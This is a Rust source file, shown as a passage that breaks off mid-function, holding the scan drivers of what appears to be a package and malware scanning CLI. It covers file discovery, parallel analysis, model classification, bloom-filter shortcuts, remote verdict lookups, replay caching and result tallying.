//! The CLI scan drivers: walk paths, analyze, classify, print, tally.

use std::collections::HashMap;
use std::io::{self, Write as _};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use std::sync::{Arc, Mutex, PoisonError};
use std::time::{Duration, Instant, SystemTime};

use anyhow::{Context as _, Result};
use cleave::{AnalysisOptions, AnalysisReport};

use super::hopper::{Origin, renew};
use super::pipeline::{ClassifyRequest, classify_report};
use super::progress::{Progress, Spinner};
use super::render_cards::write_tiny;
use super::replay::{Hashed, Replay, Role};
use super::turns::{Turns, first_of_each_content, release};
use super::{
    DisplayFilter, ScanConfig, ScanResult, ScanSummary, add_zip_passwords,
    prefetch_cleave_resources_for,
};
use crate::bloom_repo::{Decision as BloomDecision, Gate, KNOWN_GOOD_FRESH, Lookup};
use crate::corpus_precheck::Verdict;
use crate::explain::ShapImportance;
use crate::model::{Classification, Model};
use crate::output::{BloomMark, BloomVerdict};
use crate::provenance::RegistryProvenance;
use crate::{Mode, OutputFormat};

/// Run a scan against a file or directory tree.
///
/// A file path is analyzed directly. A directory path is walked once by
/// `discover_files` to learn the file count upfront (for the progress bar and
/// ETA), then the discovered list is analyzed in parallel via
/// [`cleave::scan_paths`], with results streamed as they complete.
///
/// # Errors
/// Returns an error if the target path does not exist, model artifacts cannot
/// be loaded, or `cleave` analysis fails for the overall scan operation.
pub fn run(path: &Path, config: &ScanConfig) -> Result<ScanSummary> {
    let (model, shap) = load_model(config)?;
    run_with(&model, shap.as_ref(), path, config)
}

/// [`run`] with a model already loaded, for callers that scan repeatedly.
///
/// # Errors
/// As [`run`].
pub(crate) fn run_with(
    model: &Model,
    shap: Option<&ShapImportance>,
    path: &Path,
    config: &ScanConfig,
) -> Result<ScanSummary> {
    if !path.is_file() && !path.is_dir() {
        anyhow::bail!("path does not exist: {}", path.display());
    }
    let paths = [path.to_path_buf()];
    let targets = Targets::of(&paths);
    run_paths_with(
        model,
        shap,
        &paths,
        targets,
        config,
        None,
        Replays::default(),
    )
}

/// The model and SHAP table `config` names.
fn load_model(config: &ScanConfig) -> Result<(Model, Option<ShapImportance>)> {
    let model = crate::models_repo::load(config.model_dir(), config.thresholds(), config.level())?;
    let shap = ShapImportance::load_or_warn(config.model_dir());
    Ok((model, shap))
}

/// Scan a set of file and directory paths, classifying every file.
///
/// Explicit files are analyzed together as one parallel batch (via
/// [`cleave::scan_files`]); each directory argument is streamed through cleave's
/// recursive walker. Both feed one session's tally, so the returned
/// [`ScanSummary`] aggregates across every path. Results print in completion
/// order, not argument order.
///
/// A path that is neither a file nor a directory is logged and counted as an
/// error; the remaining paths are still scanned.
///
/// # Errors
/// Propagates model-load and cleave setup failures, and stdout closing under
/// the scan (`BrokenPipe`), which stops it. Per-file analysis errors are
/// recorded in the summary, not returned.
pub fn run_paths(
    paths: &[PathBuf],
    config: &ScanConfig,
    registry_map: Option<&HashMap<String, RegistryProvenance>>,
) -> Result<ScanSummary> {
    let targets = Targets::of(paths);
    let alone = targets.alone();
    let load_replays = || {
        if replays_apply(config, registry_map) {
            targets.replays(config)
        } else {
            Replays::default()
        }
    };
    // The model, cleave's rules and the files' earlier scans load
    // independently, so the model and the scans get a thread each while this
    // one prefetches the rules: one after the other, the model's ~60 ms and
    // the hashing of every file were added to the scan's startup. The
    // prefetch stays on the calling thread, which is not a rayon worker (see
    // `prefetch_cleave_resources`).
    let (loaded, replays) = std::thread::scope(|scope| {
        let model = std::thread::Builder::new()
            .name("model-load".into())
            .spawn_scoped(scope, || load_model(config));
        let replays = std::thread::Builder::new()
            .name("replay-load".into())
            .spawn_scoped(scope, load_replays);
        // A batch names its rule count in the banner whatever is replayed.
        // The one file named has no banner, and no rule is needed to replay
        // it, so its rules wait to hear that it has to be analyzed.
        if !alone {
            prefetch_cleave_resources_for(paths);
        }
        let replays = joined(replays, load_replays);
        if alone && !replays.answer_all() {
            prefetch_cleave_resources_for(paths);
        }
        (joined(model, || load_model(config)), replays)
    });
    let (model, shap) = loaded?;
    run_paths_with(
        &model,
        shap.as_ref(),
        paths,
        targets,
        config,
        registry_map,
        replays,
    )
}

/// What `work` returned on the thread started for it, or what it returns
/// here when there was no thread to spare.
fn joined<T>(
    thread: io::Result<std::thread::ScopedJoinHandle<'_, T>>,
    work: impl FnOnce() -> T,
) -> T {
    match thread {
        Ok(handle) => handle
            .join()
            .unwrap_or_else(|panic| std::panic::resume_unwind(panic)),
        Err(_) => work(),
    }
}

/// What a scan of some paths covers.
struct Targets {
    /// The files named: each is analyzed whatever the bloom filters say.
    files: Vec<PathBuf>,
    /// The files found under the directories named.
    dir_files: Vec<PathBuf>,
    /// Paths that are neither, and directory entries that could not be read.
    errors: u32,
}

impl Targets {
    /// Partition `paths`: explicit files become one unfiltered batch (a named
    /// file is always analyzed), each directory is walked upfront into its
    /// file list, and anything else is an error. Walking the directories here
    /// — rather than letting cleave stream them — tells the progress bar its
    /// denominator before analysis starts.
    fn of(paths: &[PathBuf]) -> Self {
        let errors = AtomicU32::new(0);
        let mut files = Vec::new();
        let mut dir_files = Vec::new();
        for path in paths {
            if path.is_file() {
                files.push(path.clone());
            } else if path.is_dir() {
                dir_files.extend(discover_files(path, &errors));
            } else {
                tracing::error!(path = %path.display(), "path does not exist");
                errors.fetch_add(1, Ordering::Relaxed);
            }
        }
        Self {
            files,
            dir_files,
            errors: errors.into_inner(),
        }
    }

    /// Whether the scan is of one named file and nothing else: the scan that
    /// draws a spinner and a dependency tree instead of a progress bar.
    fn alone(&self) -> bool {
        self.files.len() == 1 && self.dir_files.is_empty()
    }

    /// The earlier scan of each file, where one is kept that still answers.
    fn replays(&self, config: &ScanConfig) -> Replays {
        let named = if self.alone() {
            Role::Alone
        } else {
            Role::Named
        };
        // A named file is analyzed whatever its size; a walked one only up
        // to cleave's limit.
        let limit = analysis_options(config).max_scan_file_size;
        Replays {
            files: Replay::load_each(&self.files, named, 0, config),
            dir_files: Replay::load_each(&self.dir_files, Role::Found, limit, config),
        }
    }
}

/// What hashing a scan's files found: one place per file of [`Targets`], in
/// its order, `None` where the file was not hashed. Empty when nothing is
/// replayed.
#[derive(Default)]
struct Replays {
    files: Vec<Option<Hashed>>,
    dir_files: Vec<Option<Hashed>>,
}

impl Replays {
    /// Whether there is a replay for every file, and at least one file.
    fn answer_all(&self) -> bool {
        let mut all = self.files.iter().chain(&self.dir_files).peekable();
        all.peek().is_some()
            && all.all(|hashed| {
                hashed
                    .as_ref()
                    .is_some_and(|hashed| hashed.replay.is_some())
            })
    }
}

/// Whether a scan under `config` is kept for replay and replayed: only when
/// its result is a function of the file and the config alone (no registry
/// map supplying provenance) and printing it is all that is owed (no hopper
/// to renew). Each file of a batch is kept apart, under the [`Role`] it was
/// scanned in: what a file prints does not depend on the files beside it.
fn replays_apply(
    config: &ScanConfig,
    registry_map: Option<&HashMap<String, RegistryProvenance>>,
) -> bool {
    registry_map.is_none() && config.hopper().is_none() && config.upload_hopper().is_none()
}

/// [`run_paths`] with a model already loaded.
///
/// # Errors
/// As [`run_paths`].
fn run_paths_with(
    model: &Model,
    shap: Option<&ShapImportance>,
    paths: &[PathBuf],
    targets: Targets,
    config: &ScanConfig,
    registry_map: Option<&HashMap<String, RegistryProvenance>>,
    replays: Replays,
) -> Result<ScanSummary> {
    let mut session = Session::start(config, model, shap);
    session
        .tally
        .errors
        .fetch_add(targets.errors, Ordering::Relaxed);
    let alone = targets.alone();
    // Nothing is analyzed when the one file named is replayed, so no rule is
    // needed. Anything else needs them, for the banner if for nothing else.
    if !(alone && replays.answer_all()) {
        prefetch_cleave_resources_for(paths);
    }
    // Print the banner and start the bar, when a terminal scan covers more
    // than one file.
    let total = targets.files.len() + targets.dir_files.len();
    if config.format() == OutputFormat::Terminal && total > 1 {
        crate::output::print_banner(detection_counts(config));
        session.progress = Some(Progress::new(u32::try_from(total).unwrap_or(u32::MAX)));
    }
    // A file scanned the same way before prints what it printed then. Each
    // batch of the rest keeps its own policy, so each is offered to Uplink
    // alone.
    // Uplink is asked only about what is left, by the digests replaying
    // already took, and never about a walked file too large to analyze.
    let (mut named_shas, mut shas) = (HashMap::new(), HashMap::new());
    let files = session.replay_kept(targets.files, replays.files, &mut named_shas);
    let dir_files = session.replay_kept(targets.dir_files, replays.dir_files, &mut shas);
    let named = if alone { Role::Alone } else { Role::Named };
    let files = session.judge_remotely(files, &named_shas, 0, named);
    let limit = analysis_options(config).max_scan_file_size;
    let dir_files = session.judge_remotely(dir_files, &shas, limit, Role::Found);
    scan_partitioned(&session, &files, dir_files, &shas, registry_map, alone)?;
    session.finish()
}

/// Analyze the named files and the files found in named directories, and
/// record each result as it completes. `alone` says the scan is of one named
/// file (see [`Targets::alone`]), whatever is left of it to analyze, and
/// `shas` names the content of each walked file that was hashed.
fn scan_partitioned(
    session: &Session<'_>,
    files: &[PathBuf],
    dir_files: Vec<PathBuf>,
    shas: &HashMap<PathBuf, String>,
    registry_map: Option<&HashMap<String, RegistryProvenance>>,
    alone: bool,
) -> Result<()> {
    let kept = replays_apply(session.config, registry_map);
    let sidecar_of =
        |path: &Path, named: bool| !named && session.config.sidecars() && is_attached_sidecar(path);
    let role_of = |named: bool| match (named, alone) {
        (false, _) => Role::Found,
        (true, true) => Role::Alone,
        (true, false) => Role::Named,
    };
    // Whether `path`, whose bytes are `sha`, was replayed from a scan of the
    // same bytes that finished since this one began: a copy of a file is
    // that file's scan, shown under its own name.
    let replayed = |path: &Path, sha: &str, named: bool| {
        if !kept || sidecar_of(path, named) {
            return false;
        }
        let label = path.display().to_string();
        let Some(replay) = Replay::find(sha, &label, role_of(named), session.config) else {
            return false;
        };
        session.replay(path, &replay);
        true
    };
    let record_now = |path: &Path,
                      analyzed: Result<AnalysisReport>,
                      named: bool,
                      fetched: &(dyn Fn() + Sync)| {
        // Per-file provenance: match this artifact's content sha to its registry
        // record in `--registry-map`, the registry's own account of the package
        // recovered without a refetch — which for a deleted release is the only
        // way to have it at all. A file absent from the map scans without one.
        // A capture record lying beside the file is never read: whoever
        // supplied the file wrote that too.
        let sha = analyzed
            .as_ref()
            .ok()
            .map(|report| report.target.sha256.as_str());
        if sha.is_some_and(|sha| replayed(path, sha, named)) {
            return;
        }
        let origin = Origin {
            path,
            registry: registry_map.zip(sha).and_then(|(map, sha)| map.get(sha)),
            fetch: None,
        };
        let sidecar = sidecar_of(path, named);
        let target = Target {
            sidecar,
            // What a capture record prints depends on the file it lies
            // beside, which is no part of a replay's key.
            kept: (kept && !sidecar).then_some(role_of(named)),
            fetched: Some(fetched),
            ..Target::new(origin)
        };
        session.record(&target, analyzed, None);
    };
    // Files of one release follow the same references, so they take turns
    // at it (see `Turns`); a scan that follows none has nothing to share.
    let turns = Turns::default();
    let follows = session.config.fetch_policy().enabled();
    // The scope is what the files left for a turn are recorded in: a job of
    // the pool like any other, which nothing waits for but the end of the
    // scan.
    rayon::in_place_scope(|scope| {
        let release_of = |analyzed: &Result<AnalysisReport>| {
            analyzed.as_ref().ok().and_then(release).filter(|_| follows)
        };
        let record = |path: &Path, analyzed: Result<AnalysisReport>, named: bool| {
            let Some(release) = release_of(&analyzed) else {
                return record_now(path, analyzed, named, &|| ());
            };
            let Some((path, analyzed, named)) =
                turns.take(&release, (path.to_path_buf(), analyzed, named))
            else {
                return;
            };
            // Once this file has fetched what it follows, the files left for
            // its turn find all of that kept. They are recorded one after
            // another, beside the rest of this one.
            let passed = std::sync::Once::new();
            let pass = || {
                passed.call_once(|| {
                    let Some(next) = turns.pass(&release) else {
                        return;
                    };
                    let (turns, release) = (&turns, release.clone());
                    scope.spawn(move |_| {
                        let mut next = Some(next);
                        while let Some((path, analyzed, named)) = next {
                            record_now(&path, analyzed, named, &|| ());
                            next = turns.pass(&release);
                        }
                    });
                });
            };
            record_now(&path, analyzed, named, &pass);
            // A file that fetched nothing has the turn to pass on all the
            // same: one that was skipped, or whose analysis failed.
            pass();
        };

        // A single artifact has no file-count bar, so its static analysis —
        // extraction, disassembly, per-member scoring — would run with nothing
        // on screen for however many seconds it takes. Analyze it directly
        // with a spinner instead of through the streaming API, dropping the
        // spinner before `record` so its fetch tree and final render own the
        // terminal cleanly.
        if let ([path], true) = (
            files,
            alone && session.config.format() == OutputFormat::Terminal,
        ) {
            let label = path.file_name().map_or_else(
                || path.display().to_string(),
                |n| n.to_string_lossy().into_owned(),
            );
            let spinner = Spinner::start(&label);
            let analyzed = cleave::analyze_file(path, &named_target_opts(&session.opts))
                .with_context(|| format!("cleave analysis of {}", path.display()));
            drop(spinner);
            record(path, analyzed, true);
            return Ok(());
        }
        // The two batches differ in exactly one way: a file the operator
        // named is analyzed unconditionally, while a file found by walking a
        // directory they named is eligible for the known-good shortcut. That
        // is the whole point of the partition above — the bloom is a bulk
        // optimization, and a named path is not bulk.
        if !files.is_empty() {
            cleave::scan_files(files, &named_target_opts(&session.opts), |event| {
                if let cleave::ScanEvent::File { path, result } = event {
                    record(&path, *result, true);
                }
            })?;
        }
        // Files of the same bytes are analyzed one after another, not at
        // once: the second finds the first's analysis in the cache, where at
        // once each did all of it again.
        let (first, again) = first_of_each_content(dir_files, shas);
        if !first.is_empty() {
            cleave::scan_paths(first, &session.opts, |event| {
                if let cleave::ScanEvent::File { path, result } = event {
                    record(&path, *result, false);
                }
            })?;
        }
        // A copy of a file whose scan is kept by now is not read again.
        let again: Vec<PathBuf> = again
            .into_iter()
            .filter(|path| !shas.get(path).is_some_and(|sha| replayed(path, sha, false)))
            .collect();
        // What the second follows is kept once every file of its release
        // that took a turn has passed it on, and then it takes none: it is
        // left for the turn only while one of them still has it.
        if !again.is_empty() {
            cleave::scan_paths(again, &session.opts, |event| {
                if let cleave::ScanEvent::File { path, result } = event {
                    let Some(release) = release_of(&result) else {
                        return record_now(&path, *result, false, &|| ());
                    };
                    if let Some((path, analyzed, named)) =
                        turns.follow(&release, (path, *result, false))
                    {
                        record_now(&path, analyzed, named, &|| ());
                    }
                }
            })?;
        }
        Ok(())
    })
}

/// Bytes fetched for `scan url` or `scan purl`, and where they came from.
#[derive(Debug)]
pub(crate) struct Fetched<'a> {
    /// The display path: the URL, or the PURL.
    pub label: &'a str,
    /// The file name, which drives cleave's extension-based type detection.
    pub name: &'a str,
    /// The bytes themselves.
    pub bytes: Vec<u8>,
    /// What the registry says about the package, when one was asked.
    pub registry: Option<&'a RegistryProvenance>,
    /// What the bytes are.
    pub kind: FetchedKind<'a>,
}

/// What a [`Fetched`]'s bytes are.
#[derive(Debug, Clone, Copy)]
pub(crate) enum FetchedKind<'a> {
    /// The artifact itself, as fetched.
    Artifact(&'a fletch::fetch::FetchRecord),
    /// The registry's record of the package at `purl`, standing in for a
    /// release with no bytes left to fetch. It hashes differently on every
    /// fetch, so its verdict is routed by [`super::HopperRoute`] rather than
    /// filed under its own sha256.
    RegistryRecord {
        /// The package the record describes.
        purl: &'a str,
    },
}

/// Analyze fetched bytes exactly as a single local file: classify, render,
/// and tally. Honors `config`'s fetch policy, so the package's own declared
/// references are followed when `--follow` is set.
///
/// # Errors
/// As [`run_paths`].
pub(crate) fn run_bytes(fetched: Fetched<'_>, config: &ScanConfig) -> Result<ScanSummary> {
    let Fetched {
        label,
        name,
        bytes,
        registry,
        kind,
    } = fetched;
    let (fetch, fallback_purl) = match kind {
        FetchedKind::Artifact(record) => (Some(record), None),
        FetchedKind::RegistryRecord { purl } => (None, Some(purl)),
    };
    // Deliberately no `prefetch_cleave_resources()` here. This one-shot single-
    // artifact path (`pkg:`/`url`) never fans out across rayon, and its analyses
    // usually hit cleave's report cache — so the capability mapper's match
    // indexes (a multi-hundred-ms regex build) are left to build lazily only if
    // an analysis actually misses, and are skipped entirely on a warm scan. The
    // lazy build then runs on this main thread, so there is no rayon re-entrancy
    // to guard against. Directory paths still prefetch (they do fan out).
    let (model, shap) = load_model(config)?;
    let session = Session::start(config, &model, shap.as_ref());
    // Atomdrift Uplink first, by digest. A registry document standing in
    // for an unfetchable package is never asked about — its bytes differ on
    // every fetch.
    if fallback_purl.is_none()
        && crate::remote::asking()
        && let Some((sha, verdict)) = crate::remote::known_bytes(&bytes)
    {
        session.record_remote(label, &sha, None, &verdict, None);
        return session.finish();
    }
    // No bloom short-circuit here: a `url`/`purl` scan names the one artifact
    // the operator asked about, so its config carries no filters (see
    // `with_bloom` in main.rs) and it is always analyzed.
    let bytes = bytes::Bytes::from(bytes);
    let analyzed = cleave::analyze_bytes_shared(bytes.clone(), name, &session.opts)
        .with_context(|| format!("cleave analysis of {label}"));
    let origin = Origin {
        path: Path::new(label),
        registry,
        fetch,
    };
    // The url/purl the operator named — the fetched artifact itself, not a
    // dependency of it.
    let target = Target {
        fallback_purl,
        ..Target::new(origin)
    };
    session.record(&target, analyzed, Some(bytes));
    session.finish()
}

/// Report one artifact Uplink judged with nothing fetched or analyzed here
/// — a `scan purl` answered by its coordinate — as a one-artifact scan.
///
/// # Errors
/// As [`run_paths`].
pub(crate) fn report_remote(
    config: &ScanConfig,
    label: &str,
    sha: &str,
    purl: Option<&str>,
    verdict: &Verdict,
) -> Result<ScanSummary> {
    let (model, shap) = load_model(config)?;
    let session = Session::start(config, &model, shap.as_ref());
    session.record_remote(label, sha, purl, verdict, None);
    session.finish()
}

/// Classify a payload held entirely in memory.
///
/// This is the in-process analog of [`run`] for callers that already own the
/// bytes (HTTP proxies, S3 fetchers, fuzz harnesses, etc.). It skips the
/// filesystem round-trip used by the on-disk path and relies on cleave's
/// SHA256-keyed analysis cache to short-circuit repeated payloads.
///
/// `filename` is advisory only — cleave uses the extension as a type hint and
/// the value is echoed back in [`ScanResult::path`]. Pass something
/// human-meaningful (e.g. the URL the bytes came from) for logging.
///
/// Unlike [`run`], no `ScanSummary` aggregation happens here; one call =
/// one [`ScanResult`]. Callers that need bulk counters should aggregate.
///
/// The caller has run [`super::prefetch_cleave_resources`] once, as
/// [`crate::Analyzer::new`] does, so a call pays nothing for it.
///
/// # Errors
/// Propagates cleave analysis failures, model inference errors, and feature
/// spec mismatches.
pub(crate) fn scan_bytes(
    data: Vec<u8>,
    filename: &str,
    model: &Model,
    shap: Option<&ShapImportance>,
    config: &ScanConfig,
) -> Result<ScanResult> {
    let data = bytes::Bytes::from(data);
    let report = cleave::analyze_bytes_shared(data.clone(), filename, &analysis_options(config))
        .with_context(|| format!("cleave analysis of {filename}"))?;
    let classifier = Classifier {
        config,
        model,
        shap,
        cancel: None,
        fetched: None,
    };
    let (result, _) = classifier.classify(
        report,
        Origin::local(Path::new(filename)),
        None,
        Path::new(filename),
        Some(data),
    )?;
    Ok(result)
}

/// Scan a payload that already lives on disk, returning the same [`ScanResult`]
/// as [`scan_bytes`]. cleave memory-maps the file, so peak resident memory stays
/// bounded regardless of the payload's size — the entry point for large,
/// streamed-to-disk responses that must not be buffered whole in RAM.
///
/// `read_path` is the on-disk file to analyze; `filename` is the logical name
/// (e.g. the originating URL) echoed into the report and used for the label,
/// exactly as in [`scan_bytes`]. `read_path`'s extension still drives cleave's
/// type detection, so callers should give the temporary file a name that carries
/// the payload's real extension. Prefetching is the caller's, as for
/// [`scan_bytes`].
///
/// # Errors
/// Propagates cleave analysis failures and model inference errors.
pub(crate) fn scan_file(
    read_path: &Path,
    filename: &str,
    model: &Model,
    shap: Option<&ShapImportance>,
    config: &ScanConfig,
) -> Result<ScanResult> {
    let report = cleave::analyze_file(read_path, &analysis_options(config))
        .with_context(|| format!("cleave analysis of {filename}"))?;
    let classifier = Classifier {
        config,
        model,
        shap,
        cancel: None,
        fetched: None,
    };
    let (result, _) = classifier.classify(
        report,
        Origin::local(Path::new(filename)),
        None,
        read_path,
        None,
    )?;
    Ok(result)
}

/// The cleave options a config implies, before any per-scan additions.
fn analysis_options(config: &ScanConfig) -> AnalysisOptions {
    // Part of cleave's analysis cache key, not only a retention setting: every
    // analysis must set it the same way.
    let mut opts = AnalysisOptions {
        compact_members: true,
        slow_rule_ms: config.slow_rule_ms(),
        ..Default::default()
    };
    add_zip_passwords(&mut opts, config.zip_passwords());
    opts
}

/// One CLI scan (`run`, `run_paths`, `run_bytes`): what every file of it
/// shares, from the loaded model to the tally the summary is built from.
struct Session<'a> {
    config: &'a ScanConfig,
    model: &'a Model,
    shap: Option<&'a ShapImportance>,
    /// What every file is analyzed with, the bloom skip predicate and the
    /// Ctrl-C flag included.
    opts: AnalysisOptions,
    /// Files the skip predicate left unanalyzed; see [`SkippedByBloom`].
    skipped: SkippedByBloom,
    cancel: Arc<AtomicBool>,
    tally: Tally,
    progress: Option<Progress>,
    /// Renews each result on hopper (`--hopper`). Dropped in `finish`, which
    /// joins its thread, so every result lands before the summary prints.
    uploader: Option<crate::upload::Uploader>,
    /// Set once stdout's reader has gone away; the scan stops on it.
    broken_pipe: AtomicBool,
    started: Instant,
}

impl<'a> Session<'a> {
    /// The one setup every CLI entry point shares: arm Ctrl-C,
    /// and build the analysis options and the hopper uploader.
    fn start(config: &'a ScanConfig, model: &'a Model, shap: Option<&'a ShapImportance>) -> Self {
        let cancel = crate::interrupt::arm("Interrupted — finishing current file…");
        let mut opts = analysis_options(config);
        opts.cancellation = Some(Arc::clone(&cancel));
        let skipped = SkippedByBloom::default();
        opts.skip_predicate = bloom_skip_predicate(config, &skipped);
        if config.upload_hopper().is_none()
            && let Some(url) = config.hopper()
        {
            crate::hopper::configure(url);
        }
        let uploader = config
            .upload_hopper()
            .map(|url| crate::upload::Uploader::new(url, crate::upload::default_worker_name()));
        Self {
            config,
            model,
            shap,
            opts,
            skipped,
            cancel,
            tally: Tally::default(),
            progress: None,
            uploader,
            broken_pipe: AtomicBool::new(false),
            started: Instant::now(),
        }
    }

    /// Classify one analyzed file and account for it: tally, print, renew.
    /// Called from rayon workers, so every shared input is behind `&`/atomics.
    ///
    /// `root_bytes` keeps an in-memory root available through dependency
    /// discovery. The classifier consumes this shared handle and releases it
    /// after that phase.
    fn record(
        &self,
        target: &Target<'_>,
        analyzed: Result<AnalysisReport>,
        root_bytes: Option<bytes::Bytes>,
    ) {
        // A file cleave skipped at the predicate's word arrives as a target-only
        // report: it is counted on the decision that skipped it, never graded.
        if let Some(decision) = self.skipped.take(target.origin.path) {
            let label = target.origin.path.display().to_string();
            let benign = bloom_gate(self.config, &label, decision, |label, verdict| {
                self.write_result(|| {
                    crate::output::print_bloom_verdict(label, verdict, self.config.format())
                });
            });
            if benign.is_some_and(|n| n > 0) {
                self.tally.count(Classification::Benign);
            }
            self.advance();
            return;
        }
        // Everything else was analyzed — a named file, an adverse match, a
        // fresh known-good — and carries its bloom verdict as a mark on its
        // SHA-256 line.
        let mut bloom_mark = None;
        if let (Some(lookup), Ok(report)) = (self.config.bloom(), &analyzed)
            && let Some(digest) = burton::parse_sha256_hex(&report.target.sha256)
        {
            let decision = lookup.decide_sha256(&digest);
            tally_bloom(decision, false, &report.target.path);
            bloom_mark = BloomMark::from_decision(decision);
        }

        let classified = analyzed.and_then(|report| {
            Classifier {
                config: self.config,
                model: self.model,
                shap: self.shap,
                cancel: Some(&self.cancel),
                fetched: target.fetched,
            }
            .classify(
                report,
                target.origin,
                bloom_mark,
                target.origin.path,
                root_bytes,
            )
        });
        self.advance();
        match classified {
            // Uplink's verdict on a flagged file, reached under traits at
            // least as new as ours, stands in for this one.
            Ok((result, settled)) => match result.uplink.as_ref().filter(|o| o.stands) {
                Some(opinion) => self.account_remote(
                    &target.origin.path.display().to_string(),
                    &result.sha256,
                    None,
                    &opinion.verdict,
                    target.kept,
                    result.bloom_mark,
                ),
                None => self.report(target, result, settled),
            },
            Err(error) => self.report_error(target.origin.path, &error),
        }
    }

    /// Replay each of `files` that has an earlier scan in `hashed` (see
    /// [`Replays`]), and return the rest, noting in `shas` the content of
    /// each one that was hashed.
    fn replay_kept(
        &self,
        files: Vec<PathBuf>,
        hashed: Vec<Option<Hashed>>,
        shas: &mut HashMap<PathBuf, String>,
    ) -> Vec<PathBuf> {
        let mut hashed = hashed.into_iter();
        files
            .into_iter()
            .filter(|path| match hashed.next().flatten() {
                Some(Hashed {
                    replay: Some(replay),
                    ..
                }) => {
                    self.replay(path, &replay);
                    false
                }
                Some(Hashed { sha256, .. }) => {
                    shas.insert(path.clone(), sha256);
                    true
                }
                None => true,
            })
            .collect()
    }

    /// Account for a file whose earlier scan is replayed: tallied and shown
    /// exactly as [`Self::report`] did then.
    fn replay(&self, path: &Path, replay: &Replay) {
        self.advance();
        if let Some(lookup) = self.config.bloom()
            && let Some(digest) = burton::parse_sha256_hex(&replay.sha256)
        {
            tally_bloom(
                lookup.decide_sha256(&digest),
                false,
                &path.display().to_string(),
            );
        }
        tracing::info!(path = %path.display(), sha256 = %replay.sha256, "scan replayed");
        self.tally.count(replay.class);
        self.tally
            .static_flags
            .fetch_add(u32::from(replay.severe), Ordering::Relaxed);
        self.tally
            .flagged_candidates
            .fetch_add(replay.flagged_candidates, Ordering::Relaxed);
        // The cosmetic rows first, as they came first; a failed write of
        // them is as harmless now as it was then.
        if !replay.notes.is_empty() {
            super::print_above_bar(|| {
                let _ = io::stderr().write_all(replay.notes.as_bytes());
            });
        }
        if let Some(output) = &replay.output {
            self.write_result(|| write_stdout(output.as_bytes()));
        }
    }

    /// Hand files to Atomdrift Uplink, and return the ones left to analyze
    /// here: it answers the files it already judges, and a run that does not
    /// ask (`--local`) keeps them all. `shas` holds the digests
    /// already taken, `limit` (when not zero) the largest file asked about,
    /// and `role` what the files are to the scan, which an answer is kept
    /// under for the next one.
    fn judge_remotely(
        &self,
        files: Vec<PathBuf>,
        shas: &HashMap<PathBuf, String>,
        limit: u64,
        role: Role,
    ) -> Vec<PathBuf> {
        if !crate::remote::asking() {
            return files;
        }
        // A walked file the bloom filters let the walk pass over is settled
        // here; a named one is always analyzed.
        let lookup = self.config.bloom().filter(|_| role == Role::Found);
        let fast = self.config.mode() == Mode::Fast;
        let passed_over = |path: &Path, sha: &str| {
            lookup.is_some_and(|lookup| bloom_passes_over(lookup, fast, sha, path).2)
        };
        let mark = |sha: &str| {
            let lookup = self.config.bloom()?;
            let digest = burton::parse_sha256_hex(sha)?;
            BloomMark::from_decision(lookup.decide_sha256(&digest))
        };
        let known_bad = |sha: &str| mark(sha).is_some_and(BloomMark::is_known_bad);
        let (answered, rest) =
            crate::remote::answer_known(files, shas, limit, passed_over, known_bad);
        for (path, sha, verdict) in &answered {
            // A known-bad file keeps its mark, and is shown, whatever Uplink
            // says.
            self.advance();
            let label = path.display().to_string();
            self.account_remote(&label, sha, None, verdict, Some(role), mark(sha));
        }
        rest
    }

    /// Account for one artifact Uplink judged, as [`Self::report`] does for
    /// one analyzed here: graded at this run's level, tallied, and shown under
    /// the same rules.
    /// `kept` is the role a local file's answer is kept under for replay;
    /// `None` keeps nothing (a fetched artifact, which has no file to hash).
    fn record_remote(
        &self,
        label: &str,
        sha: &str,
        purl: Option<&str>,
        verdict: &Verdict,
        kept: Option<Role>,
    ) {
        self.advance();
        self.account_remote(label, sha, purl, verdict, kept, None);
    }

    /// [`Self::record_remote`] for an artifact already counted on the
    /// progress bar. `bloom_mark` is the file's mark, which a known-bad file
    /// keeps: it is shown, and marked, whatever Uplink says.
    fn account_remote(
        &self,
        label: &str,
        sha: &str,
        purl: Option<&str>,
        verdict: &Verdict,
        kept: Option<Role>,
        bloom_mark: Option<BloomMark>,
    ) {
        let Some(class) = crate::remote::classification(verdict.fires_at, self.config.level())
        else {
            // Already taken out of local analysis, so it is answered by nothing:
            // an error, never a silent gap that lets the scan exit clean.
            tracing::error!(
                label,
                sha,
                "remote verdict has no level; counted as an error"
            );
            self.tally.errors.fetch_add(1, Ordering::Relaxed);
            return;
        };
        self.tally.count(class);
        let shown = self.config.format().emits_every_result()
            || bloom_mark.is_some_and(BloomMark::forces_terminal_display)
            || self.config.filter().shows(class);
        let mut written = None;
        if shown {
            self.write_result(|| {
                let mut bytes = Vec::new();
                let remote = crate::output::Remote {
                    label,
                    sha256: sha,
                    purl,
                    verdict,
                    class,
                    bloom_mark,
                };
                crate::output::write_remote_verdict(&mut bytes, remote, self.config.format())?;
                write_stdout(&bytes)?;
                written = Some(bytes);
                Ok(())
            });
        }
        // Kept like a local result: when nothing else is owed for the file and
        // what was written is all of it, so the next scan asks nobody.
        let complete = self.uploader.is_none() && shown == written.is_some();
        if let Some(role) = kept.filter(|_| complete) {
            match written.map(String::from_utf8).transpose() {
                Ok(output) => {
                    Replay::remote(sha, label, class, output).store(role, self.config);
                }
                Err(_) => {
                    tracing::debug!("remote verdict output is not UTF-8; not kept for replay")
                }
            }
        }
    }

    /// Write one result to stdout around the progress bar, unless an earlier
    /// write found the pipe closed.
    fn write_result(&self, write: impl FnOnce() -> io::Result<()>) {
        if self.broken_pipe.load(Ordering::Relaxed) {
            return;
        }
        let written = match &self.progress {
            Some(progress) => progress.around_result(write),
            None => write(),
        };
        if let Err(error) = written {
            self.output_failed(&error);
        }
    }

    fn advance(&self) {
        if let Some(progress) = &self.progress {
            progress.increment();
        }
    }

    fn report(&self, target: &Target<'_>, result: ScanResult, settled: Option<String>) {
        self.tally.count(result.classification);
        self.tally
            .static_flags
            .fetch_add(u32::from(result.has_severe_findings()), Ordering::Relaxed);
        self.tally.flagged_candidates.fetch_add(
            result.dependency_attention.flagged_candidates,
            Ordering::Relaxed,
        );
        // An adversely bloom-marked file is always surfaced — its inline flag is
        // the only notice it gets, so the benign filter must not swallow a
        // known-bad file the model happens to rate benign. JSON, tiny, and
        // interpret are machine/LLM payload formats: they emit every scanned
        // file. Severe static findings also admit a terminal result, even when
        // the model's verdict is benign; `--show` selects their severity.
        let sidecar = if target.sidecar {
            let policy = SidecarPolicy::new(result.classification, result.has_severe_findings());
            tracing::debug!(
                path = %target.origin.path.display(),
                classification = ?result.classification,
                shown = policy.shown,
